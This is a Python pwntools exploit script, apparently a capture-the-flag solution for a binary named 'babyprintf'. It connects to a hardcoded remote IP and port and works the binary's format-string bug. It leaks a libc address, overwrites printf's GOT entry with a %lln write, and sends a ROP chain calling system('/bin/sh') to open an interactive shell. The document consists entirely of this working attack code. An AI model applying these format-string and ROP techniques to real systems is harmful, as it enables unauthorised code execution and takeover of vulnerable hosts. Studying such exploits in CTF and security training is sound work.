#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './babyprintf'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

#p = process('./babyprintf')
p = remote('183.129.189.60', 10043)

#leak libc
payload = '%43$p'
p.sendline(payload)
libc_start_main_addr = int(p.recvline().strip('\n'), 16) - 240
libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
system = libc.symbols['system']
binsh = next(libc.search('/bin/sh\x00'))
print "libc.address ==> " + hex(libc.address)
print "system ==> " + hex(system)

#gdb.attach(p, 'b* 0x4006DA')
#dbg()
printf_got = elf.got['printf']

printf_plt = 0x4004F0
pops_addr = 0x40074C

#null 截断手动构造
bytes = pops_addr & 0xffffff

payload =  '%%%dc' % (bytes)
payload += '%%%d$lln' % (8 + 3)
payload = payload.ljust(0x18, 'a')
payload += p64(printf_got)

p.sendline(payload)

pop_rdi = 0x400753 # pop rdi ; ret
payload = 'a'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)

p.interactive()
p.close()